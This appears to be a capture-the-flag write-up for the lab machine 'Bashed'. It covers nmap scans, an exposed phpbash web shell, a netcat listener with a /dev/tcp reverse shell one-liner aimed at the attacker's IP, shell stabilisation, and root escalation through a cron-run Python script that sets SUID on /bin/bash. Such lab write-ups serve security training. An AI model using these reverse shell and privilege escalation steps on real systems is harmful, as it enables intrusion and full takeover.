
???+ Note "Enumeration"

	=== ":octicons-codespaces-16: Port Scanning"

		``` bash
		sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.1.252 -oG allPorts
		``` 

		``` bash
		# Nmap 7.99SVN scan initiated Thu May 21 20:28:15 2026 as: nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn -oG allPorts 10.129.1.252
		# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
		Host: 10.129.1.252 ()	Status: Up
		Host: 10.129.1.252 ()	Ports: 80/open/tcp//http///	Ignored State: closed (65534)
		# Nmap done at Thu May 21 20:28:30 2026 -- 1 IP address (1 host up) scanned in 15.39 seconds

		``` 

	=== ":octicons-code-review-16: Services Running"

		``` bash
		sudo nmap -p80 -sCV 10.129.59.42 -oN targeted     
		``` 

		``` bash
		Starting Nmap 7.99SVN ( https://nmap.org ) at 2026-05-10 20:22 -0500
		Nmap scan report for 10.129.59.42
		Host is up (0.15s latency).

		PORT   STATE SERVICE VERSION
		80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
		|_http-title: Arrexel's Development Site
		|_http-server-header: Apache/2.4.18 (Ubuntu)

		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 18.13 seconds
		``` 

	=== ":octicons-browser-16: Web Scan"

		``` bash
		nmap --script http-enum -p80 10.129.59.42 -oN webScan
		```

		``` bash
		# Nmap 7.99SVN scan initiated Thu May 21 20:31:58 2026 as: nmap --script http-enum -p80 -oN webScan 10.129.1.252
		Nmap scan report for 10.129.1.252
		Host is up (0.20s latency).

		PORT   STATE SERVICE
		80/tcp open  http
		| http-enum: 
		|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
		|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
		|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
		|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
		|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
		|_  /uploads/: Potentially interesting folder

		# Nmap done at Thu May 21 20:32:34 2026 -- 1 IP address (1 host up) scanned in 36.05 seconds
		``` 


``` bash
http://bashed.htb/dev/
``` 

``` bash
Index of /dev
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[   ]	phpbash.min.php	2017-12-04 12:21	4.6K	 
[   ]	phpbash.php	2017-11-30 23:56	8.1K	 
Apache/2.4.18 (Ubuntu) Server at bashed.htb Port 80
``` 

``` bash
www-data@bashed:/var/www/html/dev# hostname -I
10.129.59.42 dead:beef::a0de:adff:fe5b:c3dd
``` 

``` bash
xjim@house:~/Documentos/htbMachines/Bashed# sudo nc -lvnp 443

Deploying root access for xjim. Password pls: 
Listening on 0.0.0.0 443
Connection received on 10.129.59.42 60326
bash: cannot set terminal process group (870): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bashed:/var/www/html/dev$
``` 

``` bash
www-data@bashed:/var/www/html/dev# bash -c "bash -i >%26 /dev/tcp/$MY_IP/443 0>%261"

bash: : Temporary failure in name resolution
bash: /dev/tcp//443: Invalid argument
``` 

``` bash
script /dev/null -c bash
ctrl+Z
reset xterm
``` 

``` bash
export TERM=xterm
stty size
stty rows xx columns xx
``` 

``` bash
sudo -l
``` 

``` bash
sudo -u scriptmanager bash
``` 

``` bash
scriptmanager@bashed:/tmp$ cat procmon.sh
#!/bin/bash

old_process="$(ps -eo user,command)"

while true; do
	new_process="$(ps -eo user,command)"
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "kworker|procmon"
	old_process="$new_process"
done
``` 

``` bash
scriptmanager@bashed:/tmp$ ./procmon.sh
> www-data sh -c cd /var/www/html/dev; sleep 3 2>&1
> www-data sleep 3
> root     /usr/sbin/CRON -f
> root     /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
> root     python test.py
< root     /usr/sbin/CRON -f
< root     /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
< root     python test.py
< www-data sh -c cd /var/www/html/dev; sleep 3 2>&1
< www-data sleep 3
> scriptm+ ps -eo user,command
< scriptm+ ps -eo user,command
< scriptm+ ps -eo user,command
...
``` 

``` bash
scriptmanager@bashed:/scripts$ ls -lah
total 16K
drwxrwxr--  2 scriptmanager scriptmanager 4.0K Jun  2  2022 .
drwxr-xr-x 23 root          root          4.0K Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 May 10 20:10 test.txt
``` 

``` bash
import os 

os.system("chmod u+s /bin/bash")
``` 

``` bash
watch -n1 ls -lah /bin/bash
``` 

``` bash
bash -p
``` 


